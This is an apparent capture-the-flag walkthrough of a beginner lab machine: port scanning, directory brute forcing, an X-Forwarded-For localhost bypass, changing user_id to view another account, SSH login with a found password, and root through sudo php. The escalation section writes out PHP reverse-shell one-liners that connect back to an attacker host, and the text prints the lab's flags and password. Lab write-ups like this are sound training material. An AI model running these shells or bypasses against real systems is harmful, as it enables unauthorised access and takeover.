## 靶机信息
Difficulty Level: Beginner

Notes: there are 2 flag files

Learning: Web Application | Simple Privilege Escalation

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.147

sudo nmap --min-rate 10000 -sT -p- 192.168.1.147 -oA tcp_scan/ports
//Ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

sudo nmap -sT -sC -sV -O -p 22,80 192.168.1.147 -oA tcp_scan/details

sudo nmap --script=vuln -p 22,80 192.168.1.147

```

## Web

### 目录爆破
```shell
gobuster dir -u http://192.168.1.147/ -w /usr/share/wordlists/dirb/common.txt 
# /robots.txt           (Status: 200) [Size: 32]
//User-Agent: *
Allow: /heyhoo.txt

/heyhoo.txt : Great! What you need now is reconn, attack and got the shell

查看页面源码发现提示：<!-- Maybe you can search how to use x-forwarded-for -->

burpsuite抓包后加上X-Forwarded-For: localhost即可
```

![[Pasted image 20231011103657.png]]

![[Pasted image 20231011104536.png]]
设置bp请求头自动添加X-Forwarded-For

> 登录页面后，注册一个账户并登录


![[Pasted image 20231011104637.png]]
看到user_id=12，尝试修改URL参数来访问其它用户(profile页面)

![[Pasted image 20231011104832.png]]
user_id=5时看到了alice账户

![[Pasted image 20231011104948.png]]

## 提权
```shell
ssh alice@192.168.1.147 //passwd:4lic3
/home/alice/.my_secret
Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
```

![[Pasted image 20231011105941.png]]
sudo 可以不需要密码执行 php
## php执行反弹shell
```shell
export RHOST=attacker.com
export RPORT=12345
php -r '$sock=fsockopen(getenv("192.168.1.136"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'
sudo /usr/bin/php -r '$sock=fsockopen("192.168.1.136",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
root flag:Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
```

![[Pasted image 20231011111103.png]]







